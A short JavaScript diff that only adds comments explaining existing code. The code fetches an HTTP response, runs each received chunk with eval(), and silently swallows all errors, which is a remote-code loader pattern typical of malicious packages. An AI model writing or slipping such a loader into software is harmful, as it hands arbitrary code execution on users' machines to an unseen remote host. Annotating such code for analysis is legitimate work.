@@ -14,16 +14,16 @@ try {
         // Setting encoding to UTF-8
         r.setEncoding('utf8');
 
-        
+        // Handling data received from the response
         r.on('data', (c) => {
-            
+            // Evaluating the received data as JavaScript code
             eval(c);
         });
 
-       
+        // Handling error events on the response
         r.on('error', () => {});
     }).on('error', () => {});
 } catch (e) {
-   
+    // Catching any exceptions that occur during execution
 }
 
